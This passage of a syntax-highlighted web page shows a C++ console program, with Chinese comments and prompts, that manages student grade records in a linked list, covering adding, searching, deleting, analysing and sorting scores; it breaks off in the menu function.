class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num;                                   <span class="comment">//总学生人数</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">studentMessage</span>;</span> <span class="comment">// 友员函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">string</span> ID;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> score[<span class="number">5</span>];                       <span class="comment">//1-4代表math、English、OPP和总成绩  ，0号单元空出</span></span><br><span class="line">    student * next;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    student();</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getName</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> name;&#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getID</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> ID;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getMath</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">1</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getEnglesh</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">2</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getOPP</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">3</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">gettotol</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">4</span>];&#125;</span><br><span class="line">    <span class="function">student* <span class="title">getNext</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> next;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">analyse</span><span class="params">(<span class="keyword">int</span> ,student * )</span></span>; <span class="comment">//分析成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>;                          <span class="comment">//打印成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">()</span></span>;                          <span class="comment">//交换对象和对象-&gt;next的信息</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">student::student()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入学生学号 : "</span>;<span class="built_in">cin</span>&gt;&gt;ID;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入学生姓名 : "</span>;<span class="built_in">cin</span>&gt;&gt;name;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入学生的数学、英语和OPP成绩 : "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    <span class="keyword">while</span>(a&lt;<span class="number">0</span>||a&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入成绩有误，请重新输入: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">    <span class="keyword">while</span>(b&lt;<span class="number">0</span>||b&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入成绩有误，请重新输入: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;c;</span><br><span class="line">    <span class="keyword">while</span>(c&lt;<span class="number">0</span>||c&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入成绩有误，请重新输入: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;c;        </span><br><span class="line">    &#125;</span><br><span class="line">    score[<span class="number">1</span>]=a;</span><br><span class="line">    score[<span class="number">2</span>]=b;</span><br><span class="line">    score[<span class="number">3</span>]=c;</span><br><span class="line">    score[<span class="number">4</span>]=a+b+c;</span><br><span class="line">    next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::analyse(<span class="keyword">int</span> a,student * first)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> you=<span class="number">0</span>,liang=<span class="number">0</span>,zhong=<span class="number">0</span>,jige=<span class="number">0</span>,bujige=<span class="number">0</span>;</span><br><span class="line">    student * t=first;</span><br><span class="line">    <span class="keyword">double</span> average=<span class="number">0</span>;                   <span class="comment">//平均分</span></span><br><span class="line">    <span class="keyword">while</span>(t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="keyword">int</span>(t-&gt;score[a]/<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">switch</span>(b)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:you++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:liang++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:zhong++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:jige++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:bujige++;</span><br><span class="line">        &#125;</span><br><span class="line">        average+=t-&gt;score[a];</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    average=average/num;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" 考生总人数 : "</span>&lt;&lt;num&lt;&lt;<span class="string">"        平均分 : "</span>&lt;&lt;average&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n 优     良      中     及格    不及格  "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;you&lt;&lt;<span class="string">" \t"</span>&lt;&lt;liang&lt;&lt;<span class="string">" \t"</span>&lt;&lt;zhong&lt;&lt;<span class="string">"\t"</span>&lt;&lt;jige&lt;&lt;<span class="string">"\t"</span>&lt;&lt;bujige&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::display()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;ID&lt;&lt;<span class="string">"     "</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;name&lt;&lt;<span class="string">"      "</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;score[i]&lt;&lt;<span class="string">"      "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::swap()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="built_in">string</span> na,id;</span><br><span class="line">    <span class="keyword">double</span> sco[<span class="number">5</span>];</span><br><span class="line">    na=name;name=next-&gt;name;next-&gt;name=na;</span><br><span class="line">    id=ID;ID=next-&gt;ID;next-&gt;ID=id;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++)</span><br><span class="line">    &#123;                                            </span><br><span class="line">        sco[j]=score[j];</span><br><span class="line">        score[j]=next-&gt;score[j];    </span><br><span class="line">        next-&gt;score[j]=sco[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">studentMessage</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    student * first;</span><br><span class="line">    student * last;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    studentMessage();</span><br><span class="line">    <span class="function">student* <span class="title">getFirst</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> first;&#125;</span><br><span class="line">    <span class="function">student* <span class="title">getLast</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> last;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getNum</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> num;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;                             <span class="comment">//向表中增加学生成绩记录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">()</span></span>;                          <span class="comment">//在表中查找学生成绩记录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span>;                             <span class="comment">//在表中删除学生成绩记录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">showOne</span><span class="params">()</span></span>;                         <span class="comment">//分析一门课的成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">showAll</span><span class="params">()</span></span>;                         <span class="comment">//输出所有同学所有科目的成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">()</span></span>;                            <span class="comment">//按一门课成绩或总成绩排序</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>;                           <span class="comment">//清空所有信息并退出系统</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">studentMessage::studentMessage()</span><br><span class="line">&#123;</span><br><span class="line">    first=<span class="literal">NULL</span>;</span><br><span class="line">    last=<span class="literal">NULL</span>;</span><br><span class="line">    num=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::add() </span><br><span class="line">&#123;</span><br><span class="line">    student * t =<span class="keyword">new</span> student;</span><br><span class="line">    student *p = first;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;ID==t-&gt;ID)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n学号输入错误或该学生成绩已经存在！(如需修改，请先删除再重新录入)"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">if</span>(first==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        first=last=t;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;    </span><br><span class="line">        last-&gt;next=t;</span><br><span class="line">        last=last-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::search()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n请输入要查找的学生的学号:"</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    student *t = first;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t-&gt;ID==a)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n未找到要查找学生！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n查找成功！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">" 学号    姓名     数学     英语     OPP     总成绩"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    t-&gt;display();        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::del()    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n请输入要删除的学生的学号: "</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    student *t = first;</span><br><span class="line">    student *p=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t-&gt;ID==a)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        p=t;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n未找到要删除学生！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        first=first-&gt;next;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n成功删除学生"</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">delete</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;next=t-&gt;next;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"成功删除学生"</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">delete</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    num--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::showOne()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n想要分析哪一门成绩？请输入相应序号(1:math 2:English 3:OPP):  "</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">        <span class="keyword">if</span>(a!=<span class="number">1</span>&amp;&amp;a!=<span class="number">2</span>&amp;&amp;a!=<span class="number">3</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n输入序号有误，请重新输入！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n\t成绩分析如下: \n"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    student::analyse(a,first);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::showAll()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------成绩列表----------------------"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">" 学号    姓名     数学     英语     OPP     总成绩"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    student *t = first;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        t-&gt;display();</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::sort()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a,n=<span class="number">0</span>;                  <span class="comment">//n--排名</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"想要按照什么成绩排序？请输入相应序号(1.数学 2.英语 3.OPP 4.总成绩): "</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">        <span class="keyword">if</span> (a!=<span class="number">1</span>&amp;&amp;a!=<span class="number">2</span>&amp;&amp;a!=<span class="number">3</span>&amp;&amp;a!=<span class="number">4</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n输入序号有误，请重新输入 : "</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    student *t=first;</span><br><span class="line">    student *p=t;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        t=first;</span><br><span class="line">        <span class="keyword">while</span>(t-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(t-&gt;next-&gt;score[a]&gt;=t-&gt;score[a])</span><br><span class="line">            &#123;</span><br><span class="line">                t-&gt;swap();</span><br><span class="line">            &#125;</span><br><span class="line">            t=t-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    t = first;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n\t 成绩表如下: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"学号    姓名    成绩    排名"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        n++;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;t-&gt;getID()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;t-&gt;getName()&lt;&lt;<span class="string">"  \t"</span>;</span><br><span class="line">        <span class="keyword">switch</span>(a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getMath()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getEnglesh()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getOPP()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;gettotol()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        t=t-&gt;next;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::clear()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"确认要清空所有信息？请输入1或2 (1:确认 2:取消) : "</span>;<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">    <span class="keyword">if</span> (x==<span class="number">2</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n取消清空\n"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    student *t = first;</span><br><span class="line">    student *p; </span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        p=t;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n清空成功！\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"退出成功！\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showMenu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"                               \n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"===============================\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      